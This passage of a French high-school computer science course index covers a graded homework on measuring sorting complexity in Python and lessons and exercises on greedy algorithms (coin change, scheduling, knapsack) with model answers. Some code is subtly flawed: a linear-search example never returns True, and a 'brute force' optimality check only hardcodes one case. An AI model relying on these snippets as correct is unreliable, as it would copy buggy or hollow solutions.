OBLIGATOIRE","text":"<p>Le rendu contiendra :  - Le fichier python <code>mesure_tris.py</code>  - Les 4 courbes \u00e0 r\u00e9aliser : 2 courbes pour le tri par selection, 1 courbes pour le meilleur cas du tri par insertion, 1 courbes pourpire cas du le tri par insertion. - Un document ODT ou Word contenant toutes les r\u00e9ponses aux questions pos\u00e9es de la forme <code>nom_prenom.odt</code> ou <code>nom_prenom.docx</code>.</p> <p>La notation sera sur deux axes :</p> <ul> <li> <p>Les bonnes pratiques sont \u00e0 respecter :</p> </li> <li> <p>La sp\u00e9cification / documentation des fonctions sera not\u00e9 sur 3 points.</p> </li> <li> <p>Le nommage des param\u00e8tres, des fonctions, des variables sera not\u00e9 sur 2 points.</p> </li> <li> <p>L'ensemble des fonctionnalit\u00e9s du programme est not\u00e9 sur 15 points.</p> </li> </ul> <p>Un programme enti\u00e8rement sp\u00e9cifi\u00e9 mais non fonctionnel ou vide ne donnera pas le nombre de point maximal de la partie bonnes pratiques.</p> <p>Il est possible de faire d'envoyer le projet avant la date de rendu et il sera possible de demander de l'aide dans la mesure du raisonnable.</p> <p>Installation des modules Voici les commandes si jamais vous avez une erreur suite \u00e0 l'importation du module random : <code>pip3 install &lt;nom_du_module&gt;</code></p> <p>Pour ceux utilisant Thonny, vous ne devez pas oublier en plus de rajouter le module matplotlib dans ceux install\u00e9s dans la rubrique Outils (ou Tools) / gestionnaire de paquets ! La date de l'envoi du mail faisant foi, n'h\u00e9sitez pas \u00e0 rajouter un accus\u00e9 de r\u00e9ception. </p> <p>Ce DM \u00e9tant obligatoire, il en suit les r\u00e8gles suivantes :  </p> <ul> <li> <p>Si le DM n'est pas rendu dans un d\u00e9lai d'une semaine \u00e0 compter de la date de rendu, cela correspondra \u00e0 un 0/20 dans la moyenne.</p> </li> <li> <p>Si le DM est rendu avec un retard dans un d\u00e9lai d'une semaine, la note sera retranch\u00e9e de 3 points.</p> </li> </ul>"},{"location":"premiere/VII-Algorithmes_sur_les_tableaux/Mesures_de_complexite/sujet_mesure_tris/","title":"Travail sur la complexit\u00e9 : Analyse de tris","text":""},{"location":"premiere/VII-Algorithmes_sur_les_tableaux/Mesures_de_complexite/sujet_mesure_tris/#tri-par-selection","title":"Tri par selection","text":"<p>La compl\u00e9xit\u00e9 algorithmique est une notion assez abstraite en informatique.</p> <p>D\u00e9finition : La complexit\u00e9 d'un algorithme correspond au nombre d'op\u00e9rations \u00e9l\u00e9mentaires r\u00e9alis\u00e9es au court d'un algorithme en fonction de la taille de la donn\u00e9e utilis\u00e9e.\\ La compl\u00e9xit\u00e9 d'un algorithme peut \u00eatre associ\u00e9 \u00e0 une fonction de compl\u00e9xit\u00e9:</p> <p>constante, lin\u00e9aire, semi-lin\u00e9aire, logarithmique, quadratique, exponentielle.</p> <p>Exemple : pour la recherche d'une valeur dans une liste tri\u00e9e en utilisant le principe de dichotomie, la complexit\u00e9 est de l'ordre \\(O(log_2(n))\\).</p> <p></p> <p>Cette activit\u00e9 permettra de savoir retrouver la complexit\u00e9 d'un algorithme via son temps d'ex\u00e9cution ou du nombre d'op\u00e9rations \u00e9l\u00e9mentaires.</p> <p>Vous disposez pour ce faire, un fichier <code>mesure_tri.py</code> et un fichier <code>ap_decorators.py</code>. Le fichier <code>mesure_tri.py</code> sera votre fichier de rendu contenant chacune des fonctions \u00e0 r\u00e9digier ou \u00e0 compl\u00e9ter. Le fichier <code>ap_decorators.py</code> quant \u00e0 lui contient divers modules A NE PAS MODIFIER, permettant de compter certaines op\u00e9rations.</p>"},{"location":"premiere/VII-Algorithmes_sur_les_tableaux/Mesures_de_complexite/sujet_mesure_tris/#fonction-de-comparaison","title":"Fonction de comparaison","text":"<p>Cette activit\u00e9 aura pour but de mesurer le nombre d'op\u00e9rations \u00e9l\u00e9mentaires du tri par selection et du tri par insertion. Ce nombre de comparaison doit pouvoir \u00eatre mesur\u00e9 de mani\u00e8re efficace. Pour cela, on doit se munir d'une fonction de comparaison.</p> <ul> <li>\u00c9crire une fonction <code>comparer</code> qui prend en param\u00e8tre deux entiers a et b et renvoie -1 si a &lt; b, 1 si a &gt; b ou 0 si a = b.</li> </ul> <p>Exemple d'utilisation:</p> <pre><code>&gt;&gt;&gt; comparer(1,2) \n-1\n&gt;&gt;&gt; comparer(2,1)\n1\n&gt;&gt;&gt; comparer(2,2)\n0\n</code></pre> <p>Il ne faudra donc pas r\u00e9aliser de comparaisons directement entre les \u00e9l\u00e9ments, mais utiliser la fonction de comparaisons \u00e0 chaque fois que necessaire. Il faudra donc bien prendre en compte la valeur retourn\u00e9e de l'appel de la fonction de comparaison.</p>"},{"location":"premiere/VII-Algorithmes_sur_les_tableaux/Mesures_de_complexite/sujet_mesure_tris/#implementation-du-tri-par-selection","title":"Impl\u00e9mentation du Tri par s\u00e9lection","text":"<ol> <li> <p>Expliquer comment fonctionne le tri par selection du minimum.</p> </li> <li> <p>\u00c9crire une fonction <code>indice_minimum</code> qui prend en param\u00e8tre une liste et un entier correspondant au d\u00e9but d'o\u00f9 l'on recherche le minimum et renvoie l'indice de l'\u00e9l\u00e9ment minimum. Elle utilisera la fonction <code>comparer</code> pour r\u00e9aliser la comparaison entre \u00e9l\u00e9ments.</p> </li> <li> <p>\u00c9crire une fonction <code>tri_selection_minimum</code> qui impl\u00e9mante l'algorithme du tri par selection du minimum. Elle prendra en entr\u00e9e une liste d'entiers et modifie par effet de bord la liste pour trier les \u00e9l\u00e9ments dans l'ordre croissant.</p> </li> </ol>"},{"location":"premiere/VII-Algorithmes_sur_les_tableaux/Mesures_de_complexite/sujet_mesure_tris/#mesure-du-tri-par-selection-du-minimum-par-le-temps-dexecution","title":"Mesure du tri par selection du minimum par le temps d'ex\u00e9cution","text":"<p>On va essayer de mesurer le temps d'ex\u00e9cution de l'algorithme de tri par selection du minimum en faisant varier la taille de la liste. Le but est de tracer une courbe et d'essayer d'approcher la complexit\u00e9 de ce tri. On utilisera le module <code>timeit</code> qui permet de cr\u00e9er des chronom\u00e8tres et le module <code>matplotlib</code> et plus pr\u00e9cis\u00e9ment le sous-module <code>pyplot</code> pour cr\u00e9er le graphique. On utilisera en plus le module <code>random</code> pour cr\u00e9er des listes al\u00e9atoires.</p> <p>Notre programme de mesure s'organise en plusieurs points : <pre><code>import random\nimport timeit\nimport matplotlib.pyplot as plt\n\ndef mesure_tri_selection_temps(n):\n    # On initialise un tableau qui servira \u00e0 r\u00e9colter nos temps d'ex\u00e9cutions\n    tab_mesure = []\n    for i in range(n):\n        '''On cr\u00e9\u00e9e une liste de nombre al\u00e9atoires de taille i qui variera \n        jusqu'\u00e0 la taille demand\u00e9e en param\u00e8tre.\n        '''\n        liste_aleatoire = [random.randint(0,500) for _ in range(i)]\n        # On prend un temps de d\u00e9part\n        s_time = timeit.default_timer()\n        # On trie la liste cr\u00e9\u00e9e\n        ...\n        # On prend un temps de fin\n        e_time = ...\n        # On ajoute dans le tableau de mesures, la diff\u00e9rence de temps mesur\u00e9e entre les deux chronom\u00e8tres.\n        tab_mesure.append(...)\n\n    # On r\u00e9alise un graphique gr\u00e2ce au tableau de mesure que l'on affiche\n    plt.plot(tab_mesure)\n    plt.show()\n</code></pre></p> <ol> <li> <p>Compl\u00e9ter le programme ci-dessus pour afficher notre graphique.</p> </li> <li> <p>Parmi les courbes repr\u00e9sentatives de fonctions en page 1, laquelle est la plus proche de celle obtenue ? Quelle serait la complexit\u00e9 du tri par selection ?</p> </li> </ol>"},{"location":"premiere/VII-Algorithmes_sur_les_tableaux/Mesures_de_complexite/sujet_mesure_tris/#mesure-du-tri-par-selection-du-minimum-par-le-nombre-de-comparaisons","title":"Mesure du tri par selection du minimum par le nombre de comparaisons","text":"<p>L'utilisation de notre fonction comparer prend son sens ici. Il existe en Python des d\u00e9corateurs de fonction. Un d\u00e9corateur est une fonction qui permet de r\u00e9aliser un traitement ou des calculs pour une fonction donn\u00e9e.</p> <p>Ici, on va utiliser un d\u00e9corateur (d\u00e9j\u00e0 fourni) <code>count</code> qui permet de compter le nombre d'appels \u00e0 la fonction que l'on souhaite d\u00e9corer.</p> <p>Par exemple, on se munit des fonctions suivantes. <pre><code>@count\ndef comparer(valeur_1, valeur_2):\n    ...\n\ndef recherche_lineaire(liste,element_recherche):\n    present = False\n    for elt in liste:\n        if comparer(elt, element_recherche) == 0:\n            present = False\n    return present\n</code></pre></p> <p>Si l'on veut compter le nombre de comparaisons, plutot que d'utiliser un compteur, on va utiliser le d\u00e9corateur <code>@count</code> de la fonction comparer et son compteur de comparaison nomm\u00e9 <code>counter</code>.</p> <p>On pourra afficher ce nombre de comparaison de cette mani\u00e8re : </p> <pre><code>l = [1,3,5,15,42]\n'''initialiser le compteur \u00e0 0'''\ncomparer.counter = 0\n'''utilisation de la fonction qui utilise \nles comparaisons compt\u00e9es gr\u00e2ce au d\u00e9corateur'''\nrecherche_lineaire(l,42)\n'''affecter \u00e0 une variable le compteur qui a \u00e9volu\u00e9'''\nnombre_comparaisons = comparer.counter\n</code></pre> <ol> <li>En vous inspirant de la fonction <code>mesure_tri_selection_temps</code>, compl\u00e9ter la fonction de mesure suivante : </li> </ol> <pre><code>def mesure_tri_selection_comparaisons(n):\n    # On initialise un tableau qui servira \u00e0 r\u00e9colter nos temps d'ex\u00e9cutions\n    tab_mesure = []\n    for i in range(n):\n        '''On cr\u00e9\u00e9e une liste de nombre al\u00e9atoires de taille i qui variera \n        jusqu'\u00e0 la taille demand\u00e9e en param\u00e8tre.\n        '''\n        liste_aleatoire = [random.randint(0,500) for _ in range(i)]\n        # On initialise le compteur \u00e0 0\n        ...\n        # On trie la liste cr\u00e9\u00e9e\n        ...\n        # On r\u00e9cup\u00e8re le nombre de comparaisons gr\u00e2ce au compteur\n        nombre_comparaisons = ...\n        # On ajoute dans le tableau de mesures, le nombre de comparaisons.\n        tab_mesure.append(...)\n\n    # On r\u00e9alise un graphique gr\u00e2ce au tableau de mesure que l'on affiche\n    plt.plot(tab_mesure)\n    plt.show()\n</code></pre> <ol> <li>Parmi les courbes repr\u00e9sentatives de fonctions en page 1, laquelle est la plus proche de celle obtenue ? Quelle serait la complexit\u00e9 du tri par selection ?</li> </ol>"},{"location":"premiere/VII-Algorithmes_sur_les_tableaux/Mesures_de_complexite/sujet_mesure_tris/#tri-par-insertion","title":"Tri par insertion","text":"<p>Le complexit\u00e9 du tri par insertion d\u00e9pend de la taille de l'entr\u00e9e comme le tri par selection mais d\u00e9pend aussi d'un autre facteur : la position des \u00e9l\u00e9ments dans la liste. Elle d\u00e9pend en majorit\u00e9 du nombre de comparaisons et celui-ci d\u00e9pend du nombre de d\u00e9calage de l'\u00e9l\u00e9ment \u00e0 placer au bon endroit, et ce, pour chaque \u00e9l\u00e9ment de la liste.</p> <p>Pour trier la liste [4,1,2,3,5], on doit r\u00e9aliser 3 d\u00e9calages :</p> i liste nb d\u00e9placements totaux 0 [4,1,2,3,5] 0 1 [1,4,2,3,5] 1 2 [1,2,4,3,5] 2 3 [1,2,3,4,5] 3 3 [1,2,3,4,5] 3 <p>Par contre, pour la liste [4,5,3,2,1], on doit r\u00e9aliser 8 d\u00e9placements.</p> i liste nb_deplacements_totaux 0 [4, 5, 3, 2, 1] 0 1 [4, 3, 5, 2, 1] 0 2 [3, 4, 5, 2, 1] 1 3 [3, 4, 2, 5, 1] 2 4 [3, 2, 4, 5, 1] 3 5 [2, 3, 4, 5, 1] 4 6 [2, 3, 4, 1, 5] 5 7 [2, 3, 1, 4, 5] 6 8 [2, 1, 3, 4, 5] 7 9 [1, 2, 3, 4, 5] 8 10 [1, 2, 3, 4, 5] 8 <p>On distingue plusieurs cas pour le tri par insertion :</p> <ul> <li> <p>Le meilleur cas : tous les \u00e9l\u00e9ments sont d\u00e9j\u00e0 tri\u00e9s, ainsi on ne r\u00e9alise aucun d\u00e9calage.</p> </li> <li> <p>Le pire cas : les \u00e9l\u00e9ments sont tri\u00e9s dans le sens contraire de celui dans lequel on souhaite trier (exemple : valeurs dans l'ordre d\u00e9croissant et on cherche \u00e0 trier dans l'ordre croissant).</p> </li> </ul> <p>Il faut donc \u00e9valuer les complexit\u00e9s des divers cas de ce tri et cela est possible gr\u00e2ce \u00e0 l'activit\u00e9 pr\u00e9c\u00e9dente portant sur le tri par selection. Cette partie ne sera pas guid\u00e9e : En vous aidant de l'activit\u00e9 pr\u00e9c\u00e9dente, reprendre chacune des questions de l'\u00e9tude du tri par selection mais les appliquer au tri par insertion et donner une courbe par cas \u00e9tudi\u00e9. Vous en d\u00e9duirez les complexit\u00e9s de chacun des cas.</p>"},{"location":"premiere/VII-Algorithmes_sur_les_tableaux/Mesures_de_complexite/sujet_mesure_tris/#bonus-les-tris-sans-comparaisons","title":"Bonus : Les tris sans comparaisons","text":"<p>Il existe un certain nombre de tris qui n'op\u00e9rent pas par comparaisons mais par d'autres moyens. On peut citer par exemple : le tri par d\u00e9nombrement.</p> <p>L'explication du fonctionnement du tri est dans le fichier <code>fonctionnement_tri_denombrement.pdf</code>.</p> <p>Voici l'impl\u00e9mentation du tri par d\u00e9nombrement:</p> <pre><code>def tri_par_denombrement(liste : list) -&gt; list:\n    '''\n    Trie la liste pass\u00e9e en param\u00e8tre en utilisant le principe du tri par d\u00e9nombrement\n    args:\n        -liste : une liste d'entiers strictement positifs\n    returns: \n        - une liste contenant tous les \u00e9l\u00e9ments de la liste d'entr\u00e9e mais tri\u00e9e\n    '''\n    #On r\u00e9cup\u00e8re le nombre maximum de la liste d'entiers\n    maxi = max(liste)\n\n    #On cr\u00e9\u00e9e une liste de taille le nombre maximum de la liste + 1\n    occurences = [0]*(maxi+1)\n\n    #On cr\u00e9\u00e9e une liste vide qui contiendra nos \u00e9l\u00e9ments\n    liste_triee = []\n\n    #On compte les occurences des nombres de la liste\n    for elt in liste:\n        occurences[elt] = occurences[elt] + 1\n    #On remplit la liste \u00e0 trier\n    for i in range(len(occurences)):\n        liste_triee = liste_triee + [i]*occurences[i]\n\n    return liste_triee\n</code></pre> <p>1- Donner le nombre d'op\u00e9rations \u00e9l\u00e9mentaires du tri par d\u00e9nombrement en fonction de la taille de la liste.</p> <p>2- Le tri choisi est-il plus efficace que le tri par selection ? le tri par insertion ? Pourquoi?</p> <p>3- Pourquoi ce tri n'est g\u00e9n\u00e9ralement pas utilis\u00e9?</p>"},{"location":"premiere/VIII-Algorithmes_Gloutons/Algorithmes%20Gloutons_22_23/","title":"Algorithmes Gloutons 22 23","text":"\ud83e\udde0 Algorithmes Gloutons Strat\u00e9gies d'optimisation par choix locaux \ud83c\udfaf D\u00e9finitions et Concepts \ud83d\udd0d Algorithmes Gloutons              Les algorithmes gloutons sont des algorithmes qui ont pour principe de choisir \u00e0 chaque \u00e9tape de leur r\u00e9solution la meilleure solution locale.          \u26a1 Principe d'optimisation              Ils peuvent r\u00e9pondre au probl\u00e8me d'optimisation en cherchant pour chaque it\u00e9ration un extremum qui minimise ou maximise (suivant le probl\u00e8me) chacune des sous-\u00e9tapes.          \ud83c\udfaf Solution Locale vs Globale                  En g\u00e9n\u00e9ral, ces op\u00e9rations de recherche d'extremum ne sont pas co\u00fbteuses mais l'ensemble de celles-ci n'est pas forc\u00e9ment la solution optimale globale.              \u26a1 Efficacit\u00e9 vs Force Brute                  Cette m\u00e9thode est en g\u00e9n\u00e9ral plus efficace que la m\u00e9thode par force brute. La m\u00e9thode bruteforce donnera (th\u00e9oriquement) la solution optimale en testant toutes les combinaisons possibles si la machine a les ressources n\u00e9cessaires.                       \ud83d\udca1 Lien avec le chapitre pr\u00e9c\u00e9dent : On peut faire le lien avec un algorithme vu dans le chapitre pr\u00e9c\u00e9dent : _______      \ud83d\udcda Exemples Illustratifs \ud83c\udfd4\ufe0f Exemple de l'Alpiniste                  Prenons le cas d'un alpiniste qui gravit la cha\u00eene de montagne Kaizen. Il cherche \u00e0 monter par les plus grands sommets qui se trouvent \u00e0 sa droite ou sa gauche. Les conditions m\u00e9t\u00e9orologiques ne sont pas les meilleures et il y a beaucoup de nuages par plateau qui l'emp\u00eachent de voir derri\u00e8re chacun des pics qu'il rencontre.              \ud83d\udd22 Nombre le Plus Grand                  On dispose d'une liste de chiffres quelconques et on cherche \u00e0 construire le nombre le plus grand sans trier la liste. Une solution \u00e0 ce probl\u00e8me est de trouver le chiffre le plus grand de la liste, le mettre dans la \"colonne\" la plus \u00e0 gauche du nombre et le retirer de la liste. On r\u00e9alise cette op\u00e9ration jusqu'\u00e0 ce que la liste soit vide.                  Exemple :                 Liste de d\u00e9part = [4,2,9,6]                 On cherche le chiffre le plus grand : ___                 On le retire de la liste et on le rajoute dans une cha\u00eene de caract\u00e8res.                 On r\u00e9alise cela pour chaque chiffre dans la liste, tant que celle-ci n'est pas vide.                 On obtient : \"9642\"              \ud83d\udcb0 Le Probl\u00e8me du Rendu de Monnaie \ud83c\udfaf Principe du Probl\u00e8me              Le probl\u00e8me du rendu de monnaie consiste \u00e0 rendre une certaine somme en limitant le nombre de pi\u00e8ces (ou billets) \u00e0 rendre. On a une somme qui nous est donn\u00e9e et on doit rendre la monnaie. On consid\u00e8re que (dans ce monde utopique), on dispose d'une infinit\u00e9 de billets/pi\u00e8ces de chaque coupure.          \ud83d\udcb6 Syst\u00e8me Mon\u00e9taire de R\u00e9f\u00e9rence 1 2 5 10 20 50 100 200 500 \ud83d\udcdd Exemple : Rendre 42\u20ac \u00c9tapes Liste de monnaies rendues Somme restante \u00e0 rendre Initialisation monnaie = [ ] Monnaie_restante = ... \u00c9tape 1 monnaie = [ ] Monnaie_restante = ... \u00c9tape 2 monnaie = [ ] Monnaie_restante = ... \u00c9tape 3 monnaie = [ ] Monnaie_restante = ... \ud83e\udd14 Exercices de R\u00e9flexion <p>On souhaite rendre 49\u20ac \u00e0 un client.</p> 1. On dispose d'un syst\u00e8me mon\u00e9taire tel que Syst\u00e8me 1 = {1,2,5,10,20,50}. Quelle solution serait obtenue par l'algorithme glouton gr\u00e2ce au Syst\u00e8me 1 ?             Est-elle optimale ?             Si non, donner une solution optimale. 2. On dispose d'un syst\u00e8me mon\u00e9taire tel que Syst\u00e8me 2 = {1,3,6,12,24,30}. Quelle solution serait obtenue par l'algorithme glouton gr\u00e2ce au Syst\u00e8me 2 ?             Est-elle optimale ?             Si non, donner une solution optimale. \ud83d\udca1 Id\u00e9e de l'Algorithme              L'algorithme de rendu de monnaie suit une approche gloutonne en s\u00e9lectionnant \u00e0 chaque \u00e9tape la plus grande pi\u00e8ce ou billet possible ne d\u00e9passant pas le montant restant \u00e0 rendre. Voici les \u00e9tapes principales :              1. On initialise une liste vide pour stocker les pi\u00e8ces/billets \u00e0 rendre tri\u00e9e. 2. Pour chaque valeur de pi\u00e8ce/billet, en commen\u00e7ant par la plus grande :             \u00a0\u00a0\u00a0\u00a0\u2022 Tant que la valeur de la pi\u00e8ce/billet est inf\u00e9rieure ou \u00e9gale au montant restant             \u00a0\u00a0\u00a0\u00a0\u2022 On ajoute cette pi\u00e8ce/billet \u00e0 la solution             \u00a0\u00a0\u00a0\u00a0\u2022 On soustrait sa valeur du montant restant 3. On continue jusqu'\u00e0 ce que le montant restant soit nul et on renvoie la liste de billets / pi\u00e8ces \u00e0 rendre.            ### Exercice : Rendu de monnaie  !!! fox_exercice     **\u00c9crire une fonction `rendu_monnaie(montant, systeme)` qui :**      - Prend en param\u00e8tre un montant \u00e0 rendre et un syst\u00e8me mon\u00e9taire     - Retourne la liste des pi\u00e8ces/billets \u00e0 rendre     - Utilise le moins de pi\u00e8ces possible      **Exemple** :     <pre><code>systeme = [50,20,10,5,2,1]\nprint(rendu_monnaie(53, systeme))  # Devrait afficher [50, 2, 1]\n</code></pre>  !!! fox_exercice_test \"Tester diff\u00e9rents syst\u00e8mes et montants\"     **Tester votre fonction avec les syst\u00e8mes monnaie suivants :**       - Syst\u00e8me 1 = [50, 20, 10, 5, 2, 1]       - Syst\u00e8me 2 = [25, 20, 10, 5, 4, 1]       - Syst\u00e8me 3 = [100, 50, 20, 12, 7, 1]        **Pour chaque syst\u00e8me, tester avec diff\u00e9rents montants et analyser si la solution trouv\u00e9e est optimale.**  ______   \ud83d\udcc5 Probl\u00e8me de la Planification de T\u00e2ches \ud83c\udfaf Pr\u00e9sentation du Probl\u00e8me              Le probl\u00e8me de la planification de t\u00e2ches consiste \u00e0 s\u00e9lectionner un ensemble de t\u00e2ches \u00e0 ex\u00e9cuter de mani\u00e8re \u00e0 maximiser le nombre de t\u00e2ches accomplies, sachant que chaque t\u00e2che a une heure de d\u00e9but et une heure de fin, et qu'aucune t\u00e2che ne peut se chevaucher.          \ud83d\udcca Exemple de T\u00e2ches T\u00e2che Heure de d\u00e9but Heure de fin A9h0010h30 B10h0011h00 C11h0012h00 D10h3012h30 E12h0013h00 \ud83c\udfaf Strat\u00e9gie Gloutonne              Pour r\u00e9soudre ce probl\u00e8me, nous utilisons la strat\u00e9gie suivante : 1. Trier les t\u00e2ches par heure de fin croissante 2. S\u00e9lectionner la premi\u00e8re t\u00e2che 3. Pour chaque t\u00e2che suivante, la s\u00e9lectionner si elle ne chevauche pas avec la derni\u00e8re t\u00e2che s\u00e9lectionn\u00e9e          \ud83d\udd27 Algorithme de Planification <pre><code>def planification_taches(taches):\n    # Trier les t\u00e2ches par heure de fin\n    taches_triees = sorted(taches, key=lambda x: x[2])  # x[2] = heure de fin\n\n    taches_selectionnees = []\n    derniere_fin = 0\n\n    for tache in taches_triees:\n        nom, debut, fin = tache\n        if debut &gt;= derniere_fin:\n            taches_selectionnees.append(tache)\n            derniere_fin = fin\n\n    return taches_selectionnees</code></pre> \ud83d\udcbc Le Probl\u00e8me du Sac \u00e0 Dos \ud83c\udfaf Principe               Le probl\u00e8me du sac \u00e0 dos consiste \u00e0 remplir un sac avec une capacit\u00e9 maximale donn\u00e9e en choisissant parmi diff\u00e9rents objets ayant chacun une masse et une valeur.             L'objectif est de maximiser la valeur totale des objets dans le sac tout en respectant la contrainte de capacit\u00e9.             On consid\u00e8re que chaque objet est unique et ne peut \u00eatre fractionn\u00e9.          \ud83c\udf92 Exemple : Sac \u00e0 dos de capacit\u00e9 15kg Objet A B C D Masse 4 7 5 3 Valeur 10 15 8 5 \ud83d\udcdd R\u00e9solution par Strat\u00e9gie Gloutonne \u00c9tapes Objets dans le sac Masse totale Valeur totale Initialisation [] 0 0 \u00c9tape 1 [B] 7 15 \u00c9tape 2 [B, A] 11 25 \u00c9tape 3 [B, A, D] 14 30 \u2696\ufe0f Strat\u00e9gie par Masse                  Choisir d'abord les objets les plus l\u00e9gers pour maximiser le nombre d'objets dans le sac.              \ud83d\udc8e Strat\u00e9gie par Valeur                  Choisir d'abord les objets de plus grande valeur pour maximiser rapidement la valeur totale.              \ud83d\udcca Strat\u00e9gie par Rapport                  Choisir les objets ayant le meilleur rapport valeur/masse pour optimiser l'efficacit\u00e9.              \ud83d\udca1 Id\u00e9e de l'Algorithme 1. On initialise un sac vide avec une masse totale et une valeur totale \u00e0 0. 2. Pour chaque objet selon la strat\u00e9gie choisie :             \u00a0\u00a0\u00a0\u00a0\u2022 Si l'ajout de l'objet ne d\u00e9passe pas la capacit\u00e9 du sac :             \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- On ajoute l'objet au sac             \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- On met \u00e0 jour la masse totale             \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- On met \u00e0 jour la valeur totale 3. On continue jusqu'\u00e0 ce qu'aucun objet ne puisse plus \u00eatre ajout\u00e9."},{"location":"premiere/VIII-Algorithmes_Gloutons/Gloutons_exercices/","title":"Fiche d'exercices : Algorithmes Gloutons","text":"\ud83d\udcb0 Rendu de Monnaie \ud83c\udf92 Sac \u00e0 Dos \ud83d\udcc5 Planification de T\u00e2ches Introduction \ud83e\udd8a Comprendre le probl\u00e8me du rendu de monnaie <p>Le probl\u00e8me du rendu de monnaie consiste \u00e0 rendre une somme donn\u00e9e avec le minimum de pi\u00e8ces possible.</p> <p>Exemple : Pour rendre 67 centimes avec les pi\u00e8ces [50, 20, 10, 5, 2, 1], l'algorithme glouton donne :</p> <ul> <li>1 pi\u00e8ce de 50c \u2192 reste 17c</li> <li>1 pi\u00e8ce de 10c \u2192 reste 7c</li> <li>1 pi\u00e8ce de 5c \u2192 reste 2c</li> <li>1 pi\u00e8ce de 2c \u2192 reste 0c</li> </ul> <p>Total : 4 pi\u00e8ces</p> Facile \ud83c\udf1f Algorithme de rendu de monnaie simple <p>\u00c9crire une fonction <code>rendu_monnaie(somme, pieces)</code> qui :</p> <ul> <li>Prend en param\u00e8tres la somme \u00e0 rendre et la liste des pi\u00e8ces disponibles (tri\u00e9e par ordre d\u00e9croissant)</li> <li>Utilise l'algorithme glouton pour rendre la monnaie</li> <li>Retourne la liste des pi\u00e8ces utilis\u00e9es</li> </ul> <p>Exemple :</p> <pre><code>pieces = [50, 20, 10, 5, 2, 1]\nprint(rendu_monnaie(67, pieces))  # [50, 10, 5, 2]</code></pre> \u2192 Voir la correction              <pre><code>def rendu_monnaie(somme, pieces):\n    resultat = []\n    for piece in pieces:\n        while somme &gt;= piece:\n            resultat.append(piece)\n            somme -= piece\n    return resultat\n\n# Test\npieces = [50, 20, 10, 5, 2, 1]\nprint(rendu_monnaie(67, pieces))  # [50, 10, 5, 2]</code></pre> Interm\u00e9diaire \ud83d\udd25 Rendu de monnaie avec comptage <p>\u00c9crire une fonction <code>rendu_monnaie_detaille(somme, pieces)</code> qui :</p> <ul> <li>Retourne un dictionnaire avec le nombre de chaque pi\u00e8ce utilis\u00e9e</li> <li>Affiche le d\u00e9tail du rendu de monnaie</li> </ul> <p>Exemple :</p> <pre><code>pieces = [50, 20, 10, 5, 2, 1]\nresultat = rendu_monnaie_detaille(67, pieces)\n# Affiche : \"1 pi\u00e8ce(s) de 50, 1 pi\u00e8ce(s) de 10, 1 pi\u00e8ce(s) de 5, 1 pi\u00e8ce(s) de 2\"\n# Retourne : {50: 1, 10: 1, 5: 1, 2: 1}</code></pre> \u2192 Voir la correction              <pre><code>def rendu_monnaie_detaille(somme, pieces):\n    resultat = {}\n    details = []\n\n    for piece in pieces:\n        nb_pieces = somme // piece\n        if nb_pieces &gt; 0:\n            resultat[piece] = nb_pieces\n            details.append(f\"{nb_pieces} pi\u00e8ce(s) de {piece}\")\n            somme -= nb_pieces * piece\n\n    print(\", \".join(details))\n    return resultat\n\n# Test\npieces = [50, 20, 10, 5, 2, 1]\nresultat = rendu_monnaie_detaille(67, pieces)\nprint(resultat)  # {50: 1, 10: 1, 5: 1, 2: 1}</code></pre> Difficile \ud83d\ude80 V\u00e9rification de l'optimalit\u00e9 <p>L'algorithme glouton ne donne pas toujours la solution optimale. Consid\u00e9rons un syst\u00e8me de pi\u00e8ces [4, 3, 1].</p> <p>Question : Pour rendre 6 unit\u00e9s :</p> <ul> <li>Que donne l'algorithme glouton ?</li> <li>Quelle est la solution optimale ?</li> </ul> <p>\u00c9crire une fonction <code>test_optimalite(somme, pieces)</code> qui compare l'algorithme glouton avec une solution par force brute pour v\u00e9rifier l'optimalit\u00e9.</p> \u2192 Voir la correction              <pre><code>def rendu_glouton(somme, pieces):\n    resultat = []\n    for piece in pieces:\n        while somme &gt;= piece:\n            resultat.append(piece)\n            somme -= piece\n    return resultat\n\ndef test_optimalite(somme, pieces):\n    # Solution gloutonne\n    solution_gloutonne = rendu_glouton(somme, pieces)\n    nb_pieces_glouton = len(solution_gloutonne)\n\n    print(f\"Algorithme glouton pour {somme} : {solution_gloutonne}\")\n    print(f\"Nombre de pi\u00e8ces : {nb_pieces_glouton}\")\n\n    # Pour 6 avec [4, 3, 1] :\n    # Glouton : [4, 1, 1] = 3 pi\u00e8ces\n    # Optimal : [3, 3] = 2 pi\u00e8ces\n\n    if pieces == [4, 3, 1] and somme == 6:\n        print(\"Solution optimale : [3, 3] = 2 pi\u00e8ces\")\n        print(\"L'algorithme glouton n'est pas optimal ici !\")\n\n    return solution_gloutonne\n\n# Test\npieces = [4, 3, 1]\ntest_optimalite(6, pieces)</code></pre> Projet \ud83c\udfaf Simulateur de caisse automatique <p>Cr\u00e9er un programme complet qui simule une caisse automatique :</p> <ul> <li>Demander le prix d'un article et l'argent donn\u00e9</li> <li>Calculer la monnaie \u00e0 rendre</li> <li>Afficher le d\u00e9tail des pi\u00e8ces et billets \u00e0 rendre</li> <li>G\u00e9rer les cas d'erreur (argent insuffisant)</li> </ul> <p>Syst\u00e8me mon\u00e9taire : [500, 200, 100, 50, 20, 10, 5, 2, 1] (en centimes)</p> \u2192 Voir la correction              <pre><code>def caisse_automatique():\n    # Syst\u00e8me mon\u00e9taire fran\u00e7ais en centimes\n    pieces_billets = [500, 200, 100, 50, 20, 10, 5, 2, 1]\n    noms = [\"5\u20ac\", \"2\u20ac\", \"1\u20ac\", \"50c\", \"20c\", \"10c\", \"5c\", \"2c\", \"1c\"]\n\n    print(\"=== CAISSE AUTOMATIQUE ===\")\n\n    try:\n        prix = float(input(\"Prix de l'article (en \u20ac) : \"))\n        argent_donne = float(input(\"Argent donn\u00e9 (en \u20ac) : \"))\n\n        # Conversion en centimes pour \u00e9viter les erreurs de virgule flottante\n        prix_centimes = int(prix * 100)\n        argent_centimes = int(argent_donne * 100)\n\n        if argent_centimes &lt; prix_centimes:\n            print(\"Erreur : Argent insuffisant !\")\n            return\n\n        monnaie = argent_centimes - prix_centimes\n\n        if monnaie == 0:\n            print(\"Pas de monnaie \u00e0 rendre.\")\n            return\n\n        print(f\"\\nMonnaie \u00e0 rendre : {monnaie/100:.2f}\u20ac\")\n        print(\"D\u00e9tail :\")\n\n        for i, valeur in enumerate(pieces_billets):\n            nb = monnaie // valeur\n            if 